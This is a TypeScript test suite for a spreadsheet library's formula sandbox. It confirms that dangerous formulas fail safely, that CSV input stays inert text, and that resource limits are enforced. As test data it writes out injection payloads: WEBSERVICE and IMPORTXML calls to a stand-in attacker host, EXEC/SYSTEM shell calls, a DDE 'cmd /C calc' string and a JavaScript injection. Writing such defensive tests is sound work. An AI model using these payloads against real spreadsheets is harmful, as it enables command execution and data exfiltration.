import { afterEach, describe, expect, test } from "bun:test";

import { Workbook } from "../../src/spreadsheet";
import { DEFAULT_FORMULA_LIMITS } from "../../src/spreadsheet-formula";

const originalFetch = globalThis.fetch;

afterEach(() => {
  globalThis.fetch = originalFetch;
});

describe("formula sandbox security", () => {
  test("never treats network, shell, import, or hyperlink formulas as capabilities", () => {
    let fetchCalls = 0;
    globalThis.fetch = (async () => {
      fetchCalls += 1;
      throw new Error("network access attempted");
    }) as unknown as typeof fetch;

    const workbook = Workbook.create();
    const sheet = workbook.worksheets.add("Untrusted");
    sheet.getRange("A1:A7").formulas = [
      ['=WEBSERVICE("https://attacker.invalid/a")'],
      ['=HYPERLINK("https://attacker.invalid/b","open")'],
      ['=IMPORTXML("https://attacker.invalid/c","//secret")'],
      ['=EXEC("/bin/sh")'],
      ['=SYSTEM("whoami")'],
      ["=cmd|' /C calc'!A0"],
      ['=DDE("cmd","/c whoami","A1")'],
    ];

    expect(sheet.getRange("A1:A7").values).toEqual([
      ["#NAME?"],
      ["#NAME?"],
      ["#NAME?"],
      ["#NAME?"],
      ["#NAME?"],
      ["#VALUE!"],
      ["#NAME?"],
    ]);
    expect(fetchCalls).toBe(0);
  });

  test("keeps CSV formula-looking input as inert text", async () => {
    const workbook = await Workbook.fromCSV(
      "=2+3,\"+SUM(A1:A2)\",-10+20,@SUM(A1:A2),cmd|' /C calc'!A0",
    );
    const values = workbook.worksheets.getActiveWorksheet().getRange("A1:E1").values;
    expect(values).toEqual([["=2+3", "+SUM(A1:A2)", "-10+20", "@SUM(A1:A2)", "cmd|' /C calc'!A0"]]);
  });

  test("cycles and unsupported functions fail as values rather than executing host code", () => {
    const workbook = Workbook.create();
    const sheet = workbook.worksheets.add("Cycles");
    sheet.getRange("A1").formulas = [["=B1"]];
    sheet.getRange("B1").formulas = [["=A1"]];
    sheet.getRange("C1").formulas = [['=JavaScript("globalThis.pwned=true")']];

    expect(sheet.getRange("A1:C1").values).toEqual([["#CYCLE!", "#CYCLE!", "#NAME?"]]);
    expect((globalThis as Record<string, unknown>).pwned).toBeUndefined();
  });

  test("rejects volatile host-clock formulas until a seeded evaluation context exists", () => {
    const workbook = Workbook.create();
    const sheet = workbook.worksheets.add("Deterministic");
    sheet.getRange("A1").formulas = [["=TODAY()"]];

    expect(sheet.getRange("A1").values).toEqual([["#NAME?"]]);
  });

  test("SEC-002 rejects formulas whose referenced cell area exceeds evaluation fuel", () => {
    const workbook = Workbook.create();
    const sheet = workbook.worksheets.add("Untrusted");
    expect(() => {
      sheet.getRange("A1").formulas = [[`=SUM(B1:B${DEFAULT_FORMULA_LIMITS.maxRangeCells + 1})`]];
    }).toThrow(/budget|limit|fuel|maximum/i);
  });

  test("SEC-003 rejects formulas beyond source, token, nesting, and argument limits", () => {
    const workbook = Workbook.create();
    const sheet = workbook.worksheets.add("Untrusted");

    expect(() => {
      sheet.getRange("A1").formulas = [
        [["=", "x".repeat(DEFAULT_FORMULA_LIMITS.maxFormulaBytes)].join("")],
      ];
    }).toThrow(/formula|byte|length|limit/i);

    const deeplyNested = `=${"(".repeat(DEFAULT_FORMULA_LIMITS.maxNestingDepth + 1)}1${")".repeat(DEFAULT_FORMULA_LIMITS.maxNestingDepth + 1)}`;
    expect(() => {
      sheet.getRange("A2").formulas = [[deeplyNested]];
    }).toThrow(/nesting|depth|limit/i);

    const tooManyArguments = `=SUM(${new Array<string>(
      DEFAULT_FORMULA_LIMITS.maxFunctionArguments + 1,
    )
      .fill("1")
      .join(",")})`;
    expect(() => {
      sheet.getRange("A3").formulas = [[tooManyArguments]];
    }).toThrow(/argument|limit/i);
  });
});
